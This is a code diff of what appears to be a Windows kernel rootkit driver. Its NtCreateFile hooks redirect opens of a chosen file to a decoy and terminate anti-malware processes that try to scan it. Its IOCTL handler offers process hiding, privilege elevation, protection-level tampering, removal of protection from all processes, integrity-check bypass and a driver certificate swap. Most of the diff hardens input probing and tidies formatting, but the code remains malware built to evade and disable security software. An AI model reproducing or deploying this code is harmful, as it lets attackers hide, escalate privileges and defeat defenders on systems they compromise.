@@ -1,6 +1,7 @@
 #include "header.h"
 #include "ZwSwapCert.h"
 
+
 NTSTATUS WINAPI FakeNtCreateFile2(
     PHANDLE            FileHandle,
     ACCESS_MASK        DesiredAccess,
@@ -14,11 +15,209 @@ NTSTATUS WINAPI FakeNtCreateFile2(
     PVOID              EaBuffer,
     ULONG              EaLength
 ) {
-    NTSTATUS status = STATUS_UNSUCCESSFUL; 
+
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
 
     __try
     {
+        KPROCESSOR_MODE prevMode = ExGetPreviousMode();
+        if (prevMode == UserMode)
+        {
+            __try
+            {
+                if (ObjectAttributes) // https://x.com/sixtyvividtails/status/1990792400378478610
+                {
+                    ProbeForRead(ObjectAttributes, sizeof(OBJECT_ATTRIBUTES), sizeof(PVOID));
 
+                    if (ObjectAttributes->ObjectName)
+                    {
+                        ProbeForRead(ObjectAttributes->ObjectName, sizeof(UNICODE_STRING), sizeof(PVOID));
+
+                        if (ObjectAttributes->ObjectName->Buffer && ObjectAttributes->ObjectName->Length > 0)
+                        {
+                            ProbeForRead(
+                                ObjectAttributes->ObjectName->Buffer,
+                                ObjectAttributes->ObjectName->Length,
+                                sizeof(WCHAR)
+                            );
+                        }
+                    }
+                }
+
+                if (FileHandle)
+                    ProbeForRead(FileHandle, sizeof(HANDLE), sizeof(PVOID));
+
+                if (IoStatusBlock)
+                    ProbeForRead(IoStatusBlock, sizeof(IO_STATUS_BLOCK), sizeof(PVOID));
+
+            }
+            __except (EXCEPTION_EXECUTE_HANDLER)
+            {
+                DbgPrint("ProbeForRead failed: 0x%08X\n", GetExceptionCode());
+                return GetExceptionCode();
+            }
+        }
+
+        __try
+        {
+            if (ObjectAttributes &&
+                ObjectAttributes->ObjectName &&
+                ObjectAttributes->ObjectName->Buffer)
+            {
+
+                if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename) &&
+                    !wcsstr(ObjectAttributes->ObjectName->Buffer, L".lnk"))
+                {
+                    PEPROCESS process = NULL;
+
+                    NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)PsGetCurrentProcessId(), &process);
+
+                    if (!NT_SUCCESS(ret))
+                    {
+                        if (ret == STATUS_INVALID_PARAMETER)
+                        {
+                            DbgPrint("the process ID was not found.\n");
+                        }
+                        else if (ret == STATUS_INVALID_CID)
+                        {
+                            DbgPrint("the specified client ID is not valid.\n");
+                        }
+                        return ret;
+                    }
+
+
+                    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + eoffsets.protection_offset;
+                    BYTE protectionLevel = *(BYTE*)EProtectionLevel;
+
+
+                    ObDereferenceObject(process);
+
+                    RtlCopyUnicodeString(ObjectAttributes->ObjectName, &xHooklist.decoyFile);
+                    ObjectAttributes->ObjectName->Length = xHooklist.decoyFile.Length;
+                    ObjectAttributes->ObjectName->MaximumLength = xHooklist.decoyFile.MaximumLength;
+
+
+                    if (protectionLevel == global_protection_levels.PS_PROTECTED_ANTIMALWARE_LIGHT)
+                    {
+                        DbgPrint("anti-malware trying to scan it!!\n");
+
+                        status = ZwTerminateProcess(ZwCurrentProcess(), STATUS_SUCCESS);
+                        if (!NT_SUCCESS(status))
+                        {
+                            DbgPrint("Failed to terminate the anti-malware: %08X\n", status);
+                        }
+                        else
+                        {
+                            DbgPrint("anti-malware terminated successfully.\n");
+                        }
+                    }
+
+                    return IoCreateFile(
+                        FileHandle,
+                        DesiredAccess,
+                        ObjectAttributes,
+                        IoStatusBlock,
+                        AllocationSize,
+                        FileAttributes,
+                        ShareAccess,
+                        CreateDisposition,
+                        CreateOptions,
+                        EaBuffer,
+                        EaLength,
+                        CreateFileTypeNone,
+                        NULL,
+                        0
+                    );
+                }
+            }
+
+            return IoCreateFile(
+                FileHandle,
+                DesiredAccess,
+                ObjectAttributes,
+                IoStatusBlock,
+                AllocationSize,
+                FileAttributes,
+                ShareAccess,
+                CreateDisposition,
+                CreateOptions,
+                EaBuffer,
+                EaLength,
+                CreateFileTypeNone,
+                NULL,
+                0
+            );
+        }
+        __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
+        {
+            DbgPrint("An issue occurred while hooking NtCreateFile (Hook Removed) (%08X)\n", GetExceptionCode());
+            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
+            return GetExceptionCode();
+        }
+    }
+    __finally
+    {
+        //KeReleaseMutex(&Mutex, 0);
+    }
+
+    return status;
+}
+
+
+NTSTATUS WINAPI FakeNtCreateFile3(
+    PHANDLE            FileHandle,
+    ACCESS_MASK        DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PIO_STATUS_BLOCK   IoStatusBlock,
+    PLARGE_INTEGER     AllocationSize,
+    ULONG              FileAttributes,
+    ULONG              ShareAccess,
+    ULONG              CreateDisposition,
+    ULONG              CreateOptions,
+    PVOID              EaBuffer,
+    ULONG              EaLength
+) {
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
+
+    __try
+    {
+        KPROCESSOR_MODE prevMode = ExGetPreviousMode();
+        if (prevMode == UserMode)
+        {
+            __try
+            {
+                if (ObjectAttributes)
+                {
+                    ProbeForRead(ObjectAttributes, sizeof(OBJECT_ATTRIBUTES), sizeof(PVOID));
+
+                    if (ObjectAttributes->ObjectName)
+                    {
+                        ProbeForRead(ObjectAttributes->ObjectName, sizeof(UNICODE_STRING), sizeof(PVOID));
+
+                        if (ObjectAttributes->ObjectName->Buffer && ObjectAttributes->ObjectName->Length > 0)
+                        {
+                            ProbeForRead(
+                                ObjectAttributes->ObjectName->Buffer,
+                                ObjectAttributes->ObjectName->Length,
+                                sizeof(WCHAR)
+                            );
+                        }
+                    }
+                }
+
+                if (FileHandle)
+                    ProbeForRead(FileHandle, sizeof(HANDLE), sizeof(PVOID));
+
+                if (IoStatusBlock)
+                    ProbeForRead(IoStatusBlock, sizeof(IO_STATUS_BLOCK), sizeof(PVOID));
+
+            }
+            __except (EXCEPTION_EXECUTE_HANDLER)
+            {
+                DbgPrint("ProbeForRead failed: 0x%08X\n", GetExceptionCode());
+                return GetExceptionCode();
+            }
+        }
         __try {
 
             if (ObjectAttributes &&
@@ -26,8 +225,8 @@ NTSTATUS WINAPI FakeNtCreateFile2(
                 ObjectAttributes->ObjectName->Buffer) {
 
                 // Check if the filename matches the hook list
-                if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename) &&\
-                   !wcsstr(ObjectAttributes->ObjectName->Buffer, L".lnk")) {
+                if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename))
+                {
 
                     PVOID process = NULL;
 
@@ -35,7 +234,6 @@ NTSTATUS WINAPI FakeNtCreateFile2(
 
                     if (ret != STATUS_SUCCESS)
                     {
-
                         if (ret == STATUS_INVALID_PARAMETER)
                         {
                             DbgPrint("the process ID was not found.");
@@ -48,11 +246,6 @@ NTSTATUS WINAPI FakeNtCreateFile2(
 
                         return (-1);
                     }
-
-                    RtlCopyUnicodeString(ObjectAttributes->ObjectName, &xHooklist.decoyFile);
-
-                    ObjectAttributes->ObjectName->Length = xHooklist.decoyFile.Length;
-                    ObjectAttributes->ObjectName->MaximumLength = xHooklist.decoyFile.MaximumLength;
 
 
                     ULONG_PTR EProtectionLevel = (ULONG_PTR)process + eoffsets.protection_offset;
@@ -94,127 +287,6 @@ NTSTATUS WINAPI FakeNtCreateFile2(
                 }
             }
 
-            return ( IoCreateFile(
-                FileHandle,
-                DesiredAccess,
-                ObjectAttributes,
-                IoStatusBlock,
-                AllocationSize,
-                FileAttributes,
-                ShareAccess,
-                CreateDisposition,
-                CreateOptions,
-                EaBuffer,
-                EaLength,
-                CreateFileTypeNone,
-                NULL,
-                0
-            ) );
-
-        }
-        __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
-        {
-            DbgPrint("An issue occurred while hooking NtCreateFile (Hook Removed) (%08X) \n", GetExceptionCode());
-
-            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
-        }
-    }
-    __finally
-    {
-        //KeReleaseMutex(&Mutex, 0);
-    }
-
-    return ( status );
-}
-
-
-NTSTATUS WINAPI FakeNtCreateFile3(
-    PHANDLE            FileHandle,
-    ACCESS_MASK        DesiredAccess,
-    POBJECT_ATTRIBUTES ObjectAttributes,
-    PIO_STATUS_BLOCK   IoStatusBlock,
-    PLARGE_INTEGER     AllocationSize,
-    ULONG              FileAttributes,
-    ULONG              ShareAccess,
-    ULONG              CreateDisposition,
-    ULONG              CreateOptions,
-    PVOID              EaBuffer,
-    ULONG              EaLength
-) {
-    NTSTATUS status = STATUS_UNSUCCESSFUL;
-
-    __try
-    {
-
-        __try {
-
-            if (ObjectAttributes &&
-                ObjectAttributes->ObjectName &&
-                ObjectAttributes->ObjectName->Buffer) {
-
-                // Check if the filename matches the hook list
-                if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename) )
-                {
-
-                    PVOID process = NULL;
-
-                    NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)PsGetCurrentProcessId(), &process);
-
-                    if (ret != STATUS_SUCCESS)
-                    {
-                        if (ret == STATUS_INVALID_PARAMETER)
-                        {
-                            DbgPrint("the process ID was not found.");
-                        }
-
-                        if (ret == STATUS_INVALID_CID)
-                        {
-                            DbgPrint("the specified client ID is not valid.");
-                        }
-
-                        return (-1);
-                    }
-
-
-                    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + eoffsets.protection_offset;
-
-                    if (process)
-                        ObDereferenceObject(process);
-
-                    if (*(BYTE*)EProtectionLevel == global_protection_levels.PS_PROTECTED_ANTIMALWARE_LIGHT)
-                    {
-                        DbgPrint("anti-malware trying to scan it!!\n");
-
-                        status = ZwTerminateProcess(ZwCurrentProcess(), STATUS_SUCCESS);
-                        if (!NT_SUCCESS(status))
-                        {
-                            DbgPrint("Failed to terminate the anti-malware: %08X\n", status);
-                        }
-                        else
-                        {
-                            DbgPrint("anti-malware terminated successfully.\n");
-                        }
-                    }
-
-                    return (IoCreateFile(
-                        FileHandle,
-                        DesiredAccess,
-                        ObjectAttributes,
-                        IoStatusBlock,
-                        AllocationSize,
-                        FileAttributes,
-                        ShareAccess,
-                        CreateDisposition,
-                        CreateOptions,
-                        EaBuffer,
-                        EaLength,
-                        CreateFileTypeNone,
-                        (PVOID)NULL,
-                        0
-                    ) );
-                }
-            }
-
             return (IoCreateFile(
                 FileHandle,
                 DesiredAccess,
@@ -230,7 +302,7 @@ NTSTATUS WINAPI FakeNtCreateFile3(
                 CreateFileTypeNone,
                 (PVOID)NULL,
                 0
-            ) );
+            ));
         }
         __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
         {
@@ -243,7 +315,7 @@ NTSTATUS WINAPI FakeNtCreateFile3(
         //KeReleaseMutex(&Mutex, 0);
     }
 
-    return ( status );
+    return (status);
 }
 
 NTSTATUS WINAPI FakeNtCreateFile(
@@ -264,6 +336,43 @@ NTSTATUS WINAPI FakeNtCreateFile(
 
     try
     {
+        KPROCESSOR_MODE prevMode = ExGetPreviousMode();
+        if (prevMode == UserMode)
+        {
+            __try
+            {
+                if (ObjectAttributes)
+                {
+                    ProbeForRead(ObjectAttributes, sizeof(OBJECT_ATTRIBUTES), sizeof(PVOID));
+
+                    if (ObjectAttributes->ObjectName)
+                    {
+                        ProbeForRead(ObjectAttributes->ObjectName, sizeof(UNICODE_STRING), sizeof(PVOID));
+
+                        if (ObjectAttributes->ObjectName->Buffer && ObjectAttributes->ObjectName->Length > 0)
+                        {
+                            ProbeForRead(
+                                ObjectAttributes->ObjectName->Buffer,
+                                ObjectAttributes->ObjectName->Length,
+                                sizeof(WCHAR)
+                            );
+                        }
+                    }
+                }
+
+                if (FileHandle)
+                    ProbeForRead(FileHandle, sizeof(HANDLE), sizeof(PVOID));
+
+                if (IoStatusBlock)
+                    ProbeForRead(IoStatusBlock, sizeof(IO_STATUS_BLOCK), sizeof(PVOID));
+
+            }
+            __except (EXCEPTION_EXECUTE_HANDLER)
+            {
+                DbgPrint("ProbeForRead failed: 0x%08X\n", GetExceptionCode());
+                return GetExceptionCode();
+            }
+        }
         __try {
 
             if (ObjectAttributes &&
@@ -285,7 +394,7 @@ NTSTATUS WINAPI FakeNtCreateFile(
 
                         DbgPrint("process allowed\n");
 
-                        return ( IoCreateFile(
+                        return (IoCreateFile(
                             FileHandle,
                             DesiredAccess,
                             ObjectAttributes,
@@ -300,15 +409,15 @@ NTSTATUS WINAPI FakeNtCreateFile(
                             CreateFileTypeNone,
                             (PVOID)NULL,
                             0
-                        ) );
+                        ));
                     }
 
-                    return ( STATUS_ACCESS_DENIED );
+                    return (STATUS_ACCESS_DENIED);
                 }
 
             }
 
-            return ( IoCreateFile(
+            return (IoCreateFile(
                 FileHandle,
                 DesiredAccess,
                 ObjectAttributes,
@@ -323,7 +432,7 @@ NTSTATUS WINAPI FakeNtCreateFile(
                 CreateFileTypeNone,
                 (PVOID)NULL,
                 0
-            ) );
+            ));
         }
         __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION
             ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
@@ -337,7 +446,7 @@ NTSTATUS WINAPI FakeNtCreateFile(
 
         // KeReleaseMutex(&Mutex, FALSE);
     }
-    return ( STATUS_SUCCESS );
+    return (STATUS_SUCCESS);
 }
 
 DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo, int Option)
@@ -352,19 +461,19 @@ DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo, int Option)
         hooklist_s->pID == rfileinfo.rpid)
     {
         DbgPrint("Hook already active for function 1\n");
-        return  ( STATUS_ALREADY_EXISTS );
+        return  (STATUS_ALREADY_EXISTS);
     }
 
     else if ((uintptr_t)hooklist_s->NtCreateFileHookAddress == (uintptr_t)&FakeNtCreateFile2 && Option == 2)
     {
         DbgPrint("Hook already active for function 2\n");
-        return  ( STATUS_ALREADY_EXISTS );
+        return  (STATUS_ALREADY_EXISTS);
     }
 
     else if ((uintptr_t)hooklist_s->NtCreateFileHookAddress == (uintptr_t)&FakeNtCreateFile3 && Option == 3)
     {
         DbgPrint("Hook already active for function 3\n");
-        return  ( STATUS_ALREADY_EXISTS );
+        return  (STATUS_ALREADY_EXISTS);
     }
 
 
@@ -379,7 +488,7 @@ DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo, int Option)
 
     else if (Option == 2)
         hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile2;
-    else if (Option == 3 )
+    else if (Option == 3)
         hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile3;
 
 
@@ -391,7 +500,7 @@ DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo, int Option)
 
     DbgPrint("Hooks installed \n");
 
-    return  ( 0 );
+    return (0);
 }
 
 void
@@ -410,7 +519,7 @@ unloadv(
             PrepareDriverForUnload();
 
         }
-        __except ( EXCEPTION_EXECUTE_HANDLER ) {
+        __except (EXCEPTION_EXECUTE_HANDLER) {
             DbgPrint("An error occured during driver unloading \n");
         }
     }
@@ -429,7 +538,7 @@ NTSTATUS processIoctlRequest(
     IRP* Irp
 )
 {
-    PIO_STACK_LOCATION  pstack   = IoGetCurrentIrpStackLocation(Irp);
+    PIO_STACK_LOCATION  pstack = IoGetCurrentIrpStackLocation(Irp);
     KPROCESSOR_MODE     prevMode = ExGetPreviousMode();
 
     int pstatus = 0;
@@ -445,153 +554,134 @@ NTSTATUS processIoctlRequest(
             pstatus = ERROR_UNSUPPORTED_OFFSET;
             __leave;
         }
-        // https://x.com/ZeroMemoryEx/status/1990477074457387066 to add this later
-        /*
-        if (prevMode == UserMode && Irp->AssociatedIrp.SystemBuffer)
-        {
-            __try
-            {
-                ProbeForRead(
-                    Irp->AssociatedIrp.SystemBuffer,
-                    pstack->Parameters.DeviceIoControl.InputBufferLength,
-                    1
-                );
-            }
-            __except (EXCEPTION_EXECUTE_HANDLER)
-            {
-                pstatus = GetExceptionCode();
-                DbgPrint("ProbeForRead failed :((((((  : 0x%08X\n", pstatus);
-                __leave;
-            }
-        }
-        */
+
         switch (pstack->Parameters.DeviceIoControl.IoControlCode)
         {
-            case HIDE_PROC:
+        case HIDE_PROC:
+        {
+            if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
             {
-                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
-                {
-                    pstatus = STATUS_BUFFER_TOO_SMALL;
-                    break;
-                }
-                RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
-            
-                pstatus = HideProcess(inputInt);
-            
-                DbgPrint("Received input value: %d\n", inputInt);
+                pstatus = STATUS_BUFFER_TOO_SMALL;
                 break;
             }
-            
-            case PRIVILEGE_ELEVATION:
+            RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
+
+            pstatus = HideProcess(inputInt);
+
+            DbgPrint("Received input value: %d\n", inputInt);
+            break;
+        }
+
+        case PRIVILEGE_ELEVATION:
+        {
+            if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
             {
-                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
-                {
-                    pstatus = STATUS_BUFFER_TOO_SMALL;
-                    break;
-                }
-            
-                RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
-            
-                pstatus = PrivilegeElevationForProcess(inputInt);
-            
-                DbgPrint("Received input value: %d\n", inputInt);
-            
+                pstatus = STATUS_BUFFER_TOO_SMALL;
                 break;
             }
 
-            case CR_SET_PROTECTION_LEVEL_CTL:
+            RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
+
+            pstatus = PrivilegeElevationForProcess(inputInt);
+
+            DbgPrint("Received input value: %d\n", inputInt);
+
+            break;
+        }
+
+        case CR_SET_PROTECTION_LEVEL_CTL:
+        {
+            if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(CR_SET_PROTECTION_LEVEL))
             {
-                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(CR_SET_PROTECTION_LEVEL))
-                {
-                    pstatus = STATUS_BUFFER_TOO_SMALL;
-                    break;
-                }
-            
-                PCR_SET_PROTECTION_LEVEL Args = Irp->AssociatedIrp.SystemBuffer;
-            
-                pstatus = ChangeProtectionLevel(Args);
-            
+                pstatus = STATUS_BUFFER_TOO_SMALL;
                 break;
             }
 
-            case RESTRICT_ACCESS_TO_FILE_CTL:
-            {
-                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
-                {
-                    pstatus = STATUS_BUFFER_TOO_SMALL;
-                    break;
-                }
-                fopera rfileinfo = { 0 };
-                RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
-            
-                pstatus = initializehooklist(&xHooklist, rfileinfo, 1);
-                DbgPrint("File access restricted ");
-                break;
-            }
+            PCR_SET_PROTECTION_LEVEL Args = Irp->AssociatedIrp.SystemBuffer;
 
-            case PROTECT_FILE_AGAINST_ANTI_MALWARE_CTL:
-            {
-                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
-                {
-                    pstatus = STATUS_BUFFER_TOO_SMALL;
-                    break;
-                }
-                fopera rfileinfo = { 0 };
-                RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
-            
-                pstatus = initializehooklist(&xHooklist, rfileinfo, 3);
-                DbgPrint(" file protected against anti-malware processes ");
-                break;
-            }
+            pstatus = ChangeProtectionLevel(Args);
 
-            case BYPASS_INTEGRITY_FILE_CTL: // 
-            {
-                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
-                {
-                    pstatus = STATUS_BUFFER_TOO_SMALL;
-                    break;
-                }
-                fopera rfileinfo = { 0 };
-                RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
-                pstatus = initializehooklist(&xHooklist, rfileinfo, 2);
-            
-                DbgPrint("bypass integrity check ");
-                break;
-            }
-            
-            case UNPROTECT_ALL_PROCESSES:
-            {
-                pstatus = UnprotectAllProcesses();
-            
-                DbgPrint("all Processes Protection has been removed");
-                break;
-            }
+            break;
+        }
 
-            case ZWSWAPCERT_CTL:
+        case RESTRICT_ACCESS_TO_FILE_CTL:
+        {
+            if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
             {
-                if (NT_SUCCESS(pstatus = ScDriverEntry(DeviceObject->DriverObject, registryPathCopy)) )
-                {
-                    DbgPrint("{ZwSwapCert} Driver swapped in memory and on disk.\n");
-            
-                }
-                else
-                {
-                    DbgPrint("{ZwSwapCert} Failed to swap driver \n");
-            
-                }
+                pstatus = STATUS_BUFFER_TOO_SMALL;
                 break;
             }
+            fopera rfileinfo = { 0 };
+            RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
 
-            default:
+            pstatus = initializehooklist(&xHooklist, rfileinfo, 1);
+            DbgPrint("File access restricted ");
+            break;
+        }
+
+        case PROTECT_FILE_AGAINST_ANTI_MALWARE_CTL:
+        {
+            if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
             {
-                DbgPrint("Invalid IOCTL code: 0x%08X\n", pstack->Parameters.DeviceIoControl.IoControlCode);
-                pstatus = STATUS_INVALID_DEVICE_REQUEST;
+                pstatus = STATUS_BUFFER_TOO_SMALL;
                 break;
             }
+            fopera rfileinfo = { 0 };
+            RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
+
+            pstatus = initializehooklist(&xHooklist, rfileinfo, 3);
+            DbgPrint(" file protected against anti-malware processes ");
+            break;
+        }
+
+        case BYPASS_INTEGRITY_FILE_CTL: // 
+        {
+            if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
+            {
+                pstatus = STATUS_BUFFER_TOO_SMALL;
+                break;
+            }
+            fopera rfileinfo = { 0 };
+            RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
+            pstatus = initializehooklist(&xHooklist, rfileinfo, 2);
+
+            DbgPrint("bypass integrity check ");
+            break;
+        }
+
+        case UNPROTECT_ALL_PROCESSES:
+        {
+            pstatus = UnprotectAllProcesses();
+
+            DbgPrint("all Processes Protection has been removed");
+            break;
+        }
+
+        case ZWSWAPCERT_CTL:
+        {
+            if (NT_SUCCESS(pstatus = ScDriverEntry(DeviceObject->DriverObject, registryPathCopy)))
+            {
+                DbgPrint("{ZwSwapCert} Driver swapped in memory and on disk.\n");
+
+            }
+            else
+            {
+                DbgPrint("{ZwSwapCert} Failed to swap driver \n");
+
+            }
+            break;
+        }
+
+        default:
+        {
+            DbgPrint("Invalid IOCTL code: 0x%08X\n", pstack->Parameters.DeviceIoControl.IoControlCode);
+            pstatus = STATUS_INVALID_DEVICE_REQUEST;
+            break;
+        }
         }
     }
     __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION
-        ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) 
+        ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
     {
 
         if (GetExceptionCode() == STATUS_ACCESS_VIOLATION)
@@ -607,12 +697,12 @@ NTSTATUS processIoctlRequest(
                 if (!NT_SUCCESS(pstatus))
                 {
                     DbgPrint("failed to open process (%08X)\n", pstatus);
-                
+
                 }
                 else
                 {
-                    pstatus  = ZwTerminateProcess(ZwCurrentProcess(), STATUS_SUCCESS);
-                    
+                    pstatus = ZwTerminateProcess(ZwCurrentProcess(), STATUS_SUCCESS);
+
                     if (!NT_SUCCESS(pstatus))
                     {
                         DbgPrint("failed to terminate the requestor process (%08X)\n", pstatus);
@@ -688,7 +778,7 @@ DriverEntry(
     }
 
     registryPathCopy = registryPath;
-    
+
     status = IoCreateDevice(driverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, METHOD_BUFFERED, FALSE, &driverObject->DeviceObject);
 
     if (!NT_SUCCESS(status))
@@ -716,20 +806,20 @@ DriverEntry(
     {
         DbgPrint("Offsets initialized\n");
     }
-    
+
     if (!NT_SUCCESS(status = IoRegisterShutdownNotification(driverObject->DeviceObject)))
     {
-        DbgPrint("Failed to register the shutdown notification callback (0x%08) \n",status);
+        DbgPrint("Failed to register the shutdown notification callback (0x%08) \n", status);
         unloadv(driverObject);
         return (STATUS_UNSUCCESSFUL);
     }
 
 
-    driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]  = processIoctlRequest;
-    driverObject->MajorFunction[IRP_MJ_SHUTDOWN]        = ShutdownCallback;
-    driverObject->MajorFunction[IRP_MJ_CREATE]          = IRP_MJCreate;
-    driverObject->MajorFunction[IRP_MJ_CLOSE]           = IRP_MJClose;
-    driverObject->DriverUnload                          = &unloadv;
+    driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = processIoctlRequest;
+    driverObject->MajorFunction[IRP_MJ_SHUTDOWN] = ShutdownCallback;
+    driverObject->MajorFunction[IRP_MJ_CREATE] = IRP_MJCreate;
+    driverObject->MajorFunction[IRP_MJ_CLOSE] = IRP_MJClose;
+    driverObject->DriverUnload = &unloadv;
 
     return (STATUS_SUCCESS);
 }
